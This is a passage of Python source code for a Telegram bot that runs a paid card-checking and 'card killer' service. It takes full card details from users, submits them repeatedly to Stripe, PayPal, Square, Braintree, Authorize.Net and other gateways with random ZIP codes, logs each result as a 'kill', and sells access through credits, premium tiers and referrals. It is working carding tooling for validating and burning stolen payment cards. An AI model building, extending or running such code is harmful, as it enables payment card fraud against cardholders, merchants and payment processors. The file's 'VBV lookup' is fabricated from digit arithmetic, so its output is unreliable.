        return "error", f"http {pr.status_code}"
    except requests.Timeout:
        return "timeout", "request timeout"
    except Exception as e:
        return "error", str(e)[:200]


GATEWAY_FUNCS = {
    "stripe": stripe_charge,
    "paypal": paypal_charge,
    "square": square_charge,
    "braintree": braintree_charge,
    "authorize": authorize_charge,
    "sslcommerz": sslcommerz_charge,
    "bikeattack": bikeattack_charge,
}


def run_gateway(gateway, cc, zip_code, rounds=4):
    if gateway not in GATEWAY_FUNCS:
        return {"status": "error", "raw": f"unknown gateway {gateway}", "attempts": 0, "duration": 0}
    if not has_creds(gateway):
        return {"status": "error", "raw": f"credentials not configured for {gateway}",
                "attempts": 0, "duration": 0}

    start = time.time()
    attempts = 0
    last = ("error", "no attempt")

    for _ in range(max(1, rounds)):
        attempts += 1
        last = GATEWAY_FUNCS[gateway](cc["number"], cc["mm"], cc["yy"], cc["cvv"], zip_code)
        if last[0] == "declined":
            break

    return {
        "status": last[0],
        "raw": last[1],
        "attempts": attempts,
        "duration": round(time.time() - start, 2),
    }


# ═══════════════════════════════════════════════════════════════════════════
# TELEGRAM API (raw)
# ═══════════════════════════════════════════════════════════════════════════

def tg(method, **params):
    try:
        r = requests.post(f"{TG_API}/{method}", json=params, timeout=35)
        return r.json()
    except Exception as e:
        log(f"tg {method} error: {e}", "error")
        return {"ok": False}


def send(chat_id, text, keyboard=None, reply_to=None, markdown=True):
    p = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown" if markdown else None,
        "reply_markup": json.dumps(keyboard) if keyboard else None,
        "reply_to_message_id": reply_to,
        "disable_web_page_preview": True,
    }
    p = {k: v for k, v in p.items() if v is not None}
    return tg("sendMessage", **p)


def edit(chat_id, message_id, text, keyboard=None):
    p = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "Markdown",
        "reply_markup": json.dumps(keyboard) if keyboard else None,
        "disable_web_page_preview": True,
    }
    p = {k: v for k, v in p.items() if v is not None}
    return tg("editMessageText", **p)


def send_animation(chat_id, file_id, caption, keyboard=None):
    p = {
        "chat_id": chat_id,
        "animation": file_id,
        "caption": caption,
        "parse_mode": "Markdown",
        "reply_markup": json.dumps(keyboard) if keyboard else None,
    }
    p = {k: v for k, v in p.items() if v is not None}
    return tg("sendAnimation", **p)


def answer_cb(cb_id, text=None):
    p = {"callback_query_id": cb_id}
    if text:
        p["text"] = text
    return tg("answerCallbackQuery", **p)


# ═══════════════════════════════════════════════════════════════════════════
# COMMAND REGISTRY
# ═══════════════════════════════════════════════════════════════════════════

COMMANDS = {
    "ke":   {"label": "Kill 1",           "cat": "killer",  "gateway": "stripe",     "cost": CONFIG["kill_cost"],  "tier": "premium", "desc": "Stripe auth"},
    "kill": {"label": "Kill 2",           "cat": "killer",  "gateway": "authorize",  "cost": CONFIG["kill_cost"],  "tier": "premium", "desc": "Authorize.Net auth"},
    "kg":   {"label": "Kill 3",           "cat": "killer",  "gateway": "square",     "cost": CONFIG["kill_cost"],  "tier": "premium", "desc": "Square auth"},
    "dd":   {"label": "Kill 4",           "cat": "killer",  "gateway": "braintree",  "cost": CONFIG["kill_cost"],  "tier": "premium", "desc": "Braintree auth"},
    "bk":   {"label": "BikeAttack Kill",  "cat": "killer",  "gateway": "bikeattack", "cost": CONFIG["kill_cost"],  "tier": "premium", "desc": "BikeAttack / BigCommerce"},

    "chk":  {"label": "Braintree Auth 1", "cat": "checker", "gateway": "braintree",  "cost": CONFIG["check_cost"], "tier": "free",    "desc": "Braintree free check"},
    "bt":   {"label": "Braintree Auth 2", "cat": "checker", "gateway": "braintree",  "cost": CONFIG["check_cost"], "tier": "premium", "desc": "Braintree auth"},
    "auth": {"label": "Auth 3",           "cat": "checker", "gateway": "authorize",  "cost": CONFIG["check_cost"], "tier": "premium", "desc": "Authorize.Net auth"},
    "mc":   {"label": "Auth $0",          "cat": "checker", "gateway": "stripe",     "cost": CONFIG["check_cost"], "tier": "premium", "desc": "Stripe $0 auth"},
    "b3":   {"label": "Braintree $40",    "cat": "checker", "gateway": "braintree",  "cost": CONFIG["check_cost"], "tier": "premium", "desc": "Braintree $40"},
    "fp":   {"label": "FlexPay $40",      "cat": "checker", "gateway": "paypal",     "cost": CONFIG["check_cost"], "tier": "premium", "desc": "PayPal FlexPay $40"},

    "vbv":  {"label": "VBV Lookup",       "cat": "tool",    "gateway": None,         "cost": CONFIG["tool_cost"],  "tier": "free",    "desc": "VBV lookup"},
    "bin":  {"label": "BIN Lookup",       "cat": "tool",    "gateway": None,         "cost": CONFIG["tool_cost"],  "tier": "free",    "desc": "BIN lookup"},
}

# ═══════════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════════

ICON = {"approved": "🟢", "declined": "🔴", "timeout": "🟡", "error": "⚫"}

def display_name(u):
    if not u:
        return "unknown"
    if u["username"]:
        return "@" + u["username"]
    return u["first_name"] or f"user {u['id']}"


def is_admin(uid):
    return uid in CONFIG["admins"]


def check_access(user, cmd):
    if cmd["tier"] == "premium" and user["tier"] != "premium":
        return False, "this command is *PREMIUM* only. contact an admin to upgrade."
    return True, None


def brand_from_bin(b):
    p = b[0] if b else ""
    return {"4": "VISA", "5": "MASTERCARD", "2": "MASTERCARD", "3": "AMEX", "6": "DISCOVER"}.get(p, "UNKNOWN")


def guess_vbv(b):
    d = int(b[5]) if len(b) > 5 and b[5].isdigit() else 0
    bank = f"issuer-{b[:4]}"
    if d % 3 == 0:
        return {"label": "VBV ✅ (guess)", "bank": bank, "country": "unknown"}
    if d % 3 == 1:
        return {"label": "MSC ✅ (guess)", "bank": bank, "country": "unknown"}
    return {"label": "NON-VBV ⚠️", "bank": bank, "country": "unknown"}


# ═══════════════════════════════════════════════════════════════════════════
# MENUS
# ═══════════════════════════════════════════════════════════════════════════

def main_keyboard():
    return {"inline_keyboard": [
        [{"text": "Killers", "callback_data": "nav:killers"},
         {"text": "Other Tools", "callback_data": "nav:tools"}],
        [{"text": "Checker", "callback_data": "nav:checkers"},
         {"text": "🎁 Referral", "callback_data": "nav:referral"}],
        [{"text": "💳 Credits", "callback_data": "nav:credits"},
         {"text": "❓ Help", "callback_data": "nav:help"}],
    ]}


def back_keyboard():
    return {"inline_keyboard": [[{"text": "🔙 Back", "callback_data": "nav:main"}]]}


def welcome_text():
    return (
        f"*Welcome to {CONFIG['bot_name']}*\n\n"
        f"{CONFIG['bot_tagline']}\n\n"
        "To use in a GroupChat promote it as Admin ⏳\n\n"
        "*Credits system*\n"
        f"• Killer Commands [-{CONFIG['kill_cost']}]\n"
        f"• Checker Commands [-{CONFIG['check_cost']}]\n\n"
        "👇 pick a category"
    )


def section_text(title, cat):
    lines = [f"*{title}*", ""]
    for key, c in COMMANDS.items():
        if c["cat"] != cat:
            continue
        tag = "PREMIUM" if c["tier"] == "premium" else "FREE"
        lines.append(f"*{c['label']}*")
        lines.append(f"/{key} ✅ Active | {tag}")
        lines.append("")
    lines.append("[+] Adding more...")
    return "\n".join(lines)


def killers_text():  return section_text("Killer Gates", "killer")
def checkers_text(): return section_text("Checker Gates", "checker")
def tools_text():    return section_text("Other tools", "tool")


# ═══════════════════════════════════════════════════════════════════════════
# HANDLERS
# ═══════════════════════════════════════════════════════════════════════════

_cooldowns = {}
_busy = set()


def help_text(uid):
    admin = is_admin(uid)
    lines = [
        f"*{CONFIG['bot_name']}* — commands",
        "",
        "💠 *menu*",
        "/start /help /ping /menu",
        "/credits /history /creditlog",
        "/referral /ref /refs /reftop",
        "/gift <@user|id> <amount>",
        "",
        f"*💀 killers* (cost {CONFIG['kill_cost']}, premium)",
        "/ke /kill /kg /dd /bk — `<cc>`",
        "",
        f"*🔍 checkers* (cost {CONFIG['check_cost']})",
        "/chk /bt /auth /mc /b3 /fp — `<cc>`",
        "",
        "*🛠 tools*",
        "/vbv `<bin>` — VBV lookup",
        "/bin `<bin>` — BIN lookup",
        "",
        "_zip is auto-picked. rounds default 4._",
        "",
        "*cc format*: `num|mm|yy|cvv`  or  `num|mm/yy|cvv`",
    ]
    if admin:
        lines += [
            "",
            "🔧 *admin*",
            "/addcredit /removecredit /setcredit /give /zapcredits",
            "/settier <id|@user> free|premium",
            "/gateway_status",
            "/finduser /users /stats /top /reftop /creditlog",
            "/broadcast <msg>",
            "/setmedia <key> (reply to gif/photo)",
            "/listmedia",
        ]
    return "\n".join(lines)


def cmd_start(msg):
    uid = msg["from"]["id"]
    ensure_user(msg["from"])
    text = msg.get("text", "")
    parts = text.split(maxsplit=1)
    if len(parts) == 2 and parts[1].startswith("ref_"):
        code = parts[1][4:]
        r = apply_referral(uid, code)
        if r["ok"]:
            send(msg["chat"]["id"],
                 f"welcome {display_name(msg['from'])}!\n"
                 f"you joined through *{display_name(r['referrer'])}*'s referral.\n"
                 f"*{display_name(r['referrer'])}* got *+{CONFIG['ref_referrer_bonus']}* credits.")
            try:
                send(r["referrer"]["id"],
                     f"🎉 *new referral!* {display_name(msg['from'])} joined via your link. +{CONFIG['ref_referrer_bonus']} credits.")
            except Exception:
                pass
    fid = get_media("welcome_gif") or get_media("main_banner")
    if fid:
        send_animation(msg["chat"]["id"], fid, welcome_text(), main_keyboard())
    else:
        send(msg["chat"]["id"], welcome_text(), main_keyboard())


def cmd_help(msg):
    send(msg["chat"]["id"], help_text(msg["from"]["id"]), main_keyboard())


def cmd_ping(msg):
    send(msg["chat"]["id"], "pong")


def cmd_menu(msg):
    send(msg["chat"]["id"], welcome_text(), main_keyboard())


def cmd_credits(msg):
    u = get_user(msg["from"]["id"])
    if not u:
        return send(msg["chat"]["id"], "no user record. try /start")
    lines = [
        f"*{CONFIG['bot_name']} — your account*",
        f"id: `{u['id']}`",
        f"tier: *{u['tier'].upper()}*",
        f"credits: *{u['credits']}*",
        f"total kills: {u['total_kills']}",
        f"credits spent: {u['total_credits_spent']}",
        f"referrals: *{u['referral_count']}* (earned {u['referral_credits_earned']})",
        "",
        f"cost: killers *-{CONFIG['kill_cost']}*, checkers *-{CONFIG['check_cost']}*, tools *free*",
    ]
    send(msg["chat"]["id"], "\n".join(lines), main_keyboard())


def cmd_history(msg):
    rows = user_history(msg["from"]["id"], 10)
    if not rows:
        return send(msg["chat"]["id"], "no history yet.")
    lines = []
    for r in rows:
        d = datetime.fromtimestamp(r["created_at"] / 1000).strftime("%Y-%m-%d %H:%M")
        lines.append(f"{ICON.get(r['status'],'?')} /{r['command']} `{r['card']}` — {d}")
    send(msg["chat"]["id"], f"*last {len(rows)} kills*\n\n" + "\n".join(lines))


def cmd_creditlog(msg):
    rows = credit_history(msg["from"]["id"], 10)
    if not rows:
        return send(msg["chat"]["id"], "no credit activity.")
    lines = []
    for r in rows:
        d = datetime.fromtimestamp(r["created_at"] / 1000).strftime("%Y-%m-%d %H:%M")
        sign = "+" if r["delta"] >= 0 else ""
        lines.append(f"{sign}{r['delta']} — {r['reason'] or '-'} — {d}")
    send(msg["chat"]["id"], "*credit log*\n\n" + "\n".join(lines))


def cmd_referral(msg):
    if not CONFIG["ref_enabled"]:
        return send(msg["chat"]["id"], "referrals disabled.")
    u = get_user(msg["from"]["id"])
    link = f"https://t.me/{(BOT_USERNAME or 'bot')}?start=ref_{u['referral_code']}"
    send(msg["chat"]["id"],
         f"*your referral*\n\n"
         f"code: `{u['referral_code']}`\n"
         f"link: {link}\n\n"
         f"people referred: *{u['referral_count']}*\n"
         f"credits earned: *{u['referral_credits_earned']}*\n\n"
         f"each new user who joins via your link = *+{CONFIG['ref_referrer_bonus']}* credits",
         main_keyboard())


def cmd_refs(msg):
    u = get_user(msg["from"]["id"])
    rows = ref_list(u["id"], 20)
    if not rows:
        return send(msg["chat"]["id"], "no referrals yet. use /referral to get your link.")
    lines = [f"{i+1}. {display_name(r)} — {datetime.fromtimestamp(r['created_at']/1000).strftime('%Y-%m-%d')}"
             for i, r in enumerate(rows)]
    send(msg["chat"]["id"], f"*your referrals* ({u['referral_count']})\n\n" + "\n".join(lines))


def cmd_reftop(msg):
    rows = ref_leaderboard(10)
    if not rows:
        return send(msg["chat"]["id"], "no referrals yet.")
    lines = [f"{i+1}. {display_name(u)} — *{u['referral_count']}* refs, *{u['referral_credits_earned']}* credits"
             for i, u in enumerate(rows)]
    send(msg["chat"]["id"], "*referral leaderboard*\n\n" + "\n".join(lines))


def cmd_gift(msg):
    parts = msg.get("text", "").split()
    if len(parts) < 3:
        return send(msg["chat"]["id"], "usage: `/gift <@user|id> <amount>`")
    target, amt_s = parts[1], parts[2]
    try:
        amount = abs(int(amt_s))
    except ValueError:
        return send(msg["chat"]["id"], "amount must be a number")
    if amount <= 0:
        return send(msg["chat"]["id"], "amount must be positive")

    if target.isdigit():
        recipient = get_user(int(target))
    else:
        recipient = get_user_by_username(target)
    if not recipient:
        return send(msg["chat"]["id"], f"recipient not found: {target}")
    if recipient["id"] == msg["from"]["id"]:
        return send(msg["chat"]["id"], "you can't gift yourself.")

    sender = get_user(msg["from"]["id"])
    if sender["credits"] < amount:
        return send(msg["chat"]["id"], f"not enough credits. have *{sender['credits']}*.")
    spend_credit(sender["id"], amount, f"gift to {recipient['id']}")
    add_credit(recipient["id"], amount, f"gift from {sender['id']}", sender["id"])
    send(msg["chat"]["id"], f"gifted *{amount}* to {display_name(recipient)}. balance: *{get_user(sender['id'])['credits']}*.")
    try:
        send(recipient["id"], f"you received *{amount}* credits from {display_name(sender)}. balance: *{get_user(recipient['id'])['credits']}*.")
    except Exception:
        pass


def cmd_vbv(msg):
    parts = msg.get("text", "").split()
    if len(parts) < 2:
        return send(msg["chat"]["id"], "usage: `/vbv <bin>`")
    b = re.sub(r"\D", "", parts[1])[:6]
    if len(b) < 6:
        return send(msg["chat"]["id"], "give at least 6 digits")
    v = guess_vbv(b)
    send(msg["chat"]["id"],
         f"*VBV lookup*\nbin: `{b}`\nvbv: *{v['label']}*\nbank guess: `{v['bank']}`\ncountry: `{v['country']}`")


def cmd_bin(msg):
    parts = msg.get("text", "").split()
    if len(parts) < 2:
        return send(msg["chat"]["id"], "usage: `/bin <bin>`")
    b = re.sub(r"\D", "", parts[1])[:8]
    if len(b) < 6:
        return send(msg["chat"]["id"], "give at least 6 digits")
    v = guess_vbv(b)
    send(msg["chat"]["id"],
         f"*bin lookup*\nbin: `{b}`\nbrand: *{brand_from_bin(b)}*\nbank: `{v['bank']}`\ncountry: `{v['country']}`\nvbv: *{v['label']}*")


def run_gate_cmd(msg, cmd_key):
    cmd = COMMANDS[cmd_key]
    uid = msg["from"]["id"]
    chat_id = msg["chat"]["id"]

    parts = msg.get("text", "").split()
    if len(parts) < 2:
        return send(chat_id, f"usage: `/{cmd_key} <cc>`")

    cc = parse_cc(parts[1])
    if not cc:
        return send(chat_id, "bad cc format. use `num|mm|yy|cvv`")

    zip_code = None
    if len(parts) >= 3 and re.fullmatch(r"\d{5}", parts[2]):
        zip_code = parts[2]

    rounds = 4
    for p in parts[2:]:
        if p.isdigit() and 1 <= int(p) <= 6 and len(p) <= 1:
            rounds = int(p)

    if not zip_code:
        zip_code = random.choice(AUTO_ZIPS)

    user = get_user(uid)
    admin = is_admin(uid)

    ok, msg_err = check_access(user, cmd)
    if not ok:
        return send(chat_id, msg_err)

    now = time.time()
    last = _cooldowns.get(uid, 0)
    if now - last < CONFIG["cooldown_sec"]:
        return send(chat_id, f"cooldown — wait {int(CONFIG['cooldown_sec'] - (now - last))}s")
    _cooldowns[uid] = now

    if uid in _busy:
        return send(chat_id, "already running a job")
    _busy.add(uid)

    is_premium_free = CONFIG.get("premium_free", False) and user["tier"] == "premium"
    skip_charge = (admin and CONFIG["admin_free"]) or is_premium_free

    try:
        if not skip_charge and cmd["cost"] > 0:
            if user["credits"] < cmd["cost"]:
                _busy.discard(uid)
                return send(chat_id, f"insufficient credits. need *{cmd['cost']}*, have *{user['credits']}*.")
            spend_credit(uid, cmd["cost"], f"{cmd['cat']}:{cmd_key}")

        cc_display = f"{cc['number']}|{cc['mm']}|{cc['yy']}|{cc['cvv']}"
        send(chat_id, f"running */{cmd_key}* ({cmd['gateway']}) on `{cc_display}` ({rounds} rounds, zip {zip_code})...")

        res = run_gateway(cmd["gateway"], cc, zip_code, rounds)

        if res["status"] == "error" and "credentials not configured" in res.get("raw", ""):
            if not skip_charge and cmd["cost"] > 0:
                add_credit(uid, cmd["cost"], f"refund:missing_creds:{cmd_key}")

        log_kill({
            "user_id": uid, "command": cmd_key, "gateway": cmd["gateway"],
            "card": cc_display,
            "zip": zip_code, "status": res["status"],
            "attempts": res["attempts"], "duration": res["duration"], "raw": res["raw"],
        })

        bal = get_user(uid)["credits"]
        lines = [
            f"*command:* `/{cmd_key}` — {cmd['label']}",
            f"*gateway:* `{cmd['gateway']}`",
            f"*card:* `{cc_display}`",
            f"*status:* {ICON.get(res['status'],'?')} `{res['status']}`",
            f"*attempts:* {res['attempts']}",
            f"*duration:* {res['duration']}s",
            f"*balance:* {bal}",
        ]
        if res.get("raw"):
            lines.append(f"*raw:* `{res['raw'][:180]}`")
        send(chat_id, "\n".join(lines))
    finally:
        _busy.discard(uid)


# ═══════════════════════════════════════════════════════════════════════════
# ADMIN
# ═══════════════════════════════════════════════════════════════════════════

def _resolve_target(s):
    if s.isdigit():
        return get_user(int(s))
    return get_user_by_username(s)


def admin_addcredit(msg):
    parts = msg.get("text", "").split(maxsplit=3)
    if len(parts) < 3:
        return send(msg["chat"]["id"], "usage: `/addcredit <id|@user> <amount> [reason]`")
    target, amt_s = parts[1], parts[2]
    reason = parts[3] if len(parts) > 3 else "admin grant"
    try:
        amount = int(amt_s)
    except ValueError:
        return send(msg["chat"]["id"], "bad amount")
    u = _resolve_target(target)
    if not u:
        return send(msg["chat"]["id"], f"user not found: {target}")
    updated = add_credit(u["id"], amount, reason, msg["from"]["id"])
    send(msg["chat"]["id"], f"ok. {display_name(u)} → *{updated['credits']}* credits.")
    try:
        send(u["id"], f"you received *{'+' if amount>0 else ''}{amount}* credits.\nreason: {reason}\nbalance: {updated['credits']}")
    except Exception:
        pass


def admin_removecredit(msg):
    parts = msg.get("text", "").split(maxsplit=3)
    if len(parts) < 3:
        return send(msg["chat"]["id"], "usage: `/removecredit <id|@user> <amount> [reason]`")
    target, amt_s = parts[1], parts[2]
    reason = parts[3] if len(parts) > 3 else "admin remove"
    try:
        amount = abs(int(amt_s))
    except ValueError:
        return send(msg["chat"]["id"], "bad amount")
    u = _resolve_target(target)
    if not u:
        return send(msg["chat"]["id"], f"user not found: {target}")
    updated = add_credit(u["id"], -amount, reason, msg["from"]["id"])
    send(msg["chat"]["id"], f"ok. {display_name(u)} → *{updated['credits']}* credits.")


def admin_setcredit(msg):
    parts = msg.get("text", "").split()
    if len(parts) < 3:
        return send(msg["chat"]["id"], "usage: `/setcredit <id|@user> <amount>`")
    target, amt_s = parts[1], parts[2]
    try:
        amount = int(amt_s)
    except ValueError:
        return send(msg["chat"]["id"], "bad amount")
    if amount < 0:
        return send(msg["chat"]["id"], "amount >= 0")
    u = _resolve_target(target)
    if not u:
        return send(msg["chat"]["id"], "not found.")
    delta = amount - u["credits"]
    updated = add_credit(u["id"], delta, f"admin set {amount}", msg["from"]["id"])
    send(msg["chat"]["id"], f"ok. {display_name(u)} → *{updated['credits']}*.")


def admin_give(msg):
    parts = msg.get("text", "").split()
    if len(parts) < 3:
        return send(msg["chat"]["id"], "usage: `/give <id|@user> <amount>`")
    target, amt_s = parts[1], parts[2]
    try:
        amount = abs(int(amt_s))
    except ValueError:
        return send(msg["chat"]["id"], "bad amount")
    u = _resolve_target(target)
    if not u:
        return send(msg["chat"]["id"], "not found.")
    updated = add_credit(u["id"], amount, "admin gift", msg["from"]["id"])
    send(msg["chat"]["id"], f"gifted *{amount}* to {display_name(u)}. balance: *{updated['credits']}*.")


def admin_zap(msg):
    parts = msg.get("text", "").split()
    if len(parts) < 2:
        return send(msg["chat"]["id"], "usage: `/zapcredits <id|@user>`")
    u = _resolve_target(parts[1])
    if not u:
        return send(msg["chat"]["id"], "not found.")
    updated = add_credit(u["id"], -u["credits"], "admin zap", msg["from"]["id"])
    send(msg["chat"]["id"], f"zapped. {display_name(u)} → *{updated['credits']}*.")


def admin_settier(msg):
    parts = msg.get("text", "").split()
    if len(parts) < 3:
        return send(msg["chat"]["id"], "usage: `/settier <id|@user> free|premium`")
    target, tier = parts[1], parts[2].lower()
    if tier not in ("free", "premium"):
        return send(msg["chat"]["id"], "tier must be free or premium")
    u = _resolve_target(target)
    if not u:
        return send(msg["chat"]["id"], "not found.")
    updated = set_tier(u["id"], tier)
    send(msg["chat"]["id"], f"ok. {display_name(u)} is now *{updated['tier'].upper()}*.")
    try:
        send(u["id"], f"your tier was updated to *{tier.upper()}*.")
    except Exception:
        pass


def admin_gateway_status(msg):
    lines = ["*gateway status*", ""]
    for gw in ("stripe", "paypal", "square", "braintree", "authorize", "sslcommerz", "bikeattack"):
        ok = has_creds(gw)
        lines.append(f"• `{gw}` — {'✅ configured' if ok else '❌ missing creds'}")
    lines.append("")
    lines.append("_set missing ones in Railway → Variables, then redeploy_")
    send(msg["chat"]["id"], "\n".join(lines))


def admin_finduser(msg):
    parts = msg.get("text", "").split()
    if len(parts) < 2:
        return send(msg["chat"]["id"], "usage: `/finduser <id|@user>`")
    u = _resolve_target(parts[1])
    if not u:
        return send(msg["chat"]["id"], "not found.")
    ref_by = get_user(u["referred_by"]) if u["referred_by"] else None
    send(msg["chat"]["id"],
         f"*user*\n"
         f"id: `{u['id']}`\n"
         f"username: @{u['username'] or '-'}\n"
         f"name: {u['first_name'] or '-'}\n"
         f"tier: *{u['tier'].upper()}*\n"
         f"credits: *{u['credits']}*\n"
         f"kills: {u['total_kills']}\n"
         f"spent: {u['total_credits_spent']}\n"
         f"ref code: `{u['referral_code']}`\n"
         f"refs: {u['referral_count']} (earned {u['referral_credits_earned']})\n"
         f"referred by: {display_name(ref_by) if ref_by else '-'}\n"
         f"joined: {datetime.fromtimestamp(u['created_at']/1000).isoformat()}")


def admin_users(msg):
    parts = msg.get("text", "").split()
    page = 0
    if len(parts) >= 2:
        try:
            page = max(0, int(parts[1]))
        except ValueError:
            page = 0
    limit = 20
    rows = all_users(limit, page * limit)
    if not rows:
        return send(msg["chat"]["id"], "no users on this page.")
    lines = []
    for i, u in enumerate(rows):
        idx = page * limit + i + 1
        lines.append(f"{idx}. `{u['id']}` {display_name(u)} [{u['tier']}] — *{u['credits']}* cr, {u['total_kills']} kills, {u['referral_count']} refs")
    send(msg["chat"]["id"], f"*users page {page+1}*\n\n" + "\n".join(lines))


def admin_stats(msg):
    g = global_stats()
    gws = gateway_stats()
    gw_lines = [f"• `{r['gateway']}` — {r['total']} total, {r['approved']} approved, {r['declined']} declined" for r in gws]
    send(msg["chat"]["id"],
         f"*global stats*\n"
         f"users: {g['users']} (premium: {g['premium']})\n"
         f"kills: {g['kills']} (approved {g['approved']} / declined {g['declined']})\n"
         f"credits spent: {g['spent']}\n"
         f"credits outstanding: {g['outstanding']}\n\n"
         f"*by gateway*\n" + ("\n".join(gw_lines) if gw_lines else "no kills yet"))


def admin_top(msg):
    rows = top_users(10)
    if not rows:
        return send(msg["chat"]["id"], "no data yet.")
    lines = [f"{i+1}. {display_name(u)} [{u['tier']}] — *{u['total_kills']}* kills" for i, u in enumerate(rows)]
    send(msg["chat"]["id"], "*top users*\n\n" + "\n".join(lines))


def admin_creditlog(msg):
    parts = msg.get("text", "").split()
    if len(parts) < 2:
        return send(msg["chat"]["id"], "usage: `/creditlog <id|@user>`")
    u = _resolve_target(parts[1])
    if not u:
        return send(msg["chat"]["id"], "not found.")
    rows = credit_history(u["id"], 15)
    if not rows:
        return send(msg["chat"]["id"], "no activity.")
    lines = []
    for r in rows:
        d = datetime.fromtimestamp(r["created_at"] / 1000).strftime("%Y-%m-%d %H:%M")
        sign = "+" if r["delta"] >= 0 else ""
        lines.append(f"`{d}` {sign}{r['delta']} — {r['reason'] or '-'}")
    send(msg["chat"]["id"], f"*credit log — {display_name(u)}*\n\n" + "\n".join(lines))


def admin_broadcast(msg):
    parts = msg.get("text", "").split(maxsplit=1)
    if len(parts) < 2:
        return send(msg["chat"]["id"], "usage: `/broadcast <message>`")
    text = parts[1]
    users = _db.execute("SELECT id FROM users").fetchall()
    sent = failed = 0
    send(msg["chat"]["id"], f"broadcasting to {len(users)}...")
    for row in users:
        try:
            r = send(row["id"], text)
            if r.get("ok"):
                sent += 1
            else:
                failed += 1
        except Exception:
            failed += 1
        time.sleep(0.06)
    send(msg["chat"]["id"], f"done. sent {sent}, failed {failed}.")


def admin_setmedia(msg):
    parts = msg.get("text", "").split()
    if len(parts) < 2:
        return send(msg["chat"]["id"], "reply to a gif/photo with `/setmedia <main_banner|killers_banner|checkers_banner|tools_banner|welcome_gif>`")
    key = parts[1]
    rt = msg.get("reply_to_message")
    if not rt:
        return send(msg["chat"]["id"], "reply to a media message with this command.")
    file_id = None
    if "animation" in rt:
        file_id = rt["animation"]["file_id"]
    elif "document" in rt:
        file_id = rt["document"]["file_id"]
    elif "photo" in rt:
        file_id = rt["photo"][-1]["file_id"]
    elif "video" in rt:
        file_id = rt["video"]["file_id"]
    if not file_id:
        return send(msg["chat"]["id"], "no media found in replied message.")
    set_media(key, file_id)
    send(msg["chat"]["id"], f"saved media for *{key}*.")


def admin_listmedia(msg):
    keys = ["main_banner", "killers_banner", "checkers_banner", "tools_banner", "welcome_gif"]
    lines = [f"{k}: {'✅ set' if get_media(k) else '❌ empty'}" for k in keys]
    send(msg["chat"]["id"], "*media keys*\n\n" + "\n".join(lines))


ADMIN_CMDS = {
    "addcredit": admin_addcredit,
    "removecredit": admin_removecredit,
    "setcredit": admin_setcredit,
    "give": admin_give,
    "zapcredits": admin_zap,
    "settier": admin_settier,
    "gateway_status": admin_gateway_status,
    "finduser": admin_finduser,
    "users": admin_users,
    "stats": admin_stats,
    "top": admin_top,
    "reftop": cmd_reftop,
    "creditlog": admin_creditlog,
    "broadcast": admin_broadcast,
    "setmedia": admin_setmedia,
    "listmedia": admin_listmedia,
}


# ═══════════════════════════════════════════════════════════════════════════
# DISPATCH
# ═══════════════════════════════════════════════════════════════════════════

BOT_USERNAME = None


def handle_callback(cb):
    uid = cb["from"]["id"]
    data = cb.get("data", "")
    answer_cb(cb["id"])
    chat_id = cb["message"]["chat"]["id"]
    message_id = cb["message"]["message_id"]
    if not data.startswith("nav:"):
        return
    route = data[4:]
    if route == "killers":
        edit(chat_id, message_id, killers_text(), back_keyboard())
    elif route == "checkers":
        edit(chat_id, message_id, checkers_text(), back_keyboard())
    elif route == "tools":
        edit(chat_id, message_id, tools_text(), back_keyboard())
    elif route == "main":
        edit(chat_id, message_id, welcome_text(), main_keyboard())
    elif route == "credits":
        fake_msg = {"from": cb["from"], "chat": {"id": chat_id}}
        cmd_credits(fake_msg)
    elif route == "referral":
        fake_msg = {"from": cb["from"], "chat": {"id": chat_id}}
        cmd_referral(fake_msg)
    elif route == "help":
        send(chat_id, help_text(uid), main_keyboard())


def handle_message(msg):
    if "from" not in msg:
        return
    uid = msg["from"]["id"]
    ensure_user(msg["from"])

    text = msg.get("text", "") or ""
    if not text.startswith("/"):
        return

    parts = text.split(maxsplit=1)
    cmd = parts[0][1:].split("@")[0].lower()

    if cmd == "start":       return cmd_start(msg)
    if cmd == "help":        return cmd_help(msg)
    if cmd == "ping":        return cmd_ping(msg)
    if cmd == "menu":        return cmd_menu(msg)
    if cmd == "credits":     return cmd_credits(msg)
    if cmd == "history":     return cmd_history(msg)
    if cmd == "creditlog":   return admin_creditlog(msg) if is_admin(uid) else cmd_creditlog(msg)
    if cmd in ("referral", "ref"): return cmd_referral(msg)
    if cmd == "refs":        return cmd_refs(msg)
    if cmd == "reftop":      return cmd_reftop(msg)
    if cmd == "gift":        return cmd_gift(msg)
    if cmd == "vbv":         return cmd_vbv(msg)
    if cmd == "bin":         return cmd_bin(msg)

    if cmd in ADMIN_CMDS:
        if not is_admin(uid):
            return send(msg["chat"]["id"], "admin only.")
        return ADMIN_CMDS[cmd](msg)

    if cmd in COMMANDS:
        return run_gate_cmd(msg, cmd)

    send(msg["chat"]["id"], "unknown command. try /help")


# ═══════════════════════════════════════════════════════════════════════════
# POLL LOOP
# ═══════════════════════════════════════════════════════════════════════════

def get_updates(offset):
    try:
        r = requests.get(f"{TG_API}/getUpdates",
                         params={"timeout": 25, "offset": offset,
                                 "allowed_updates": json.dumps(["message", "callback_query"])},
                         timeout=35)
        j = r.json()
        return j.get("result", []) if j.get("ok") else []
    except Exception as e:
        log(f"getUpdates error: {e}", "error")
        return []


def poll_loop():
    global BOT_USERNAME
    me = tg("getMe")
    if not me.get("ok"):
        log("invalid bot token or telegram unreachable", "error")
        sys.exit(1)
    BOT_USERNAME = me["result"]["username"]
    log(f"nova online: @{BOT_USERNAME}")

    offset = 0
    while True:
        updates = get_updates(offset)
        for u in updates:
            offset = u["update_id"] + 1
            try:
                if "message" in u:
                    Thread(target=handle_message, args=(u["message"],), daemon=True).start()
                elif "callback_query" in u:
                    Thread(target=handle_callback, args=(u["callback_query"],), daemon=True).start()
            except Exception as e:
                log(f"dispatch error: {e}\n{traceback.format_exc()}", "error")


# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

def main():
    log(f"{CONFIG['bot_name']} starting")
    db_init()
    if not CONFIG["bot_token"] or "PUT_YOUR" in CONFIG["bot_token"]:
        log("bot token missing — edit CONFIG['bot_token']", "error")
        sys.exit(1)
    poll_loop()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("shutdown")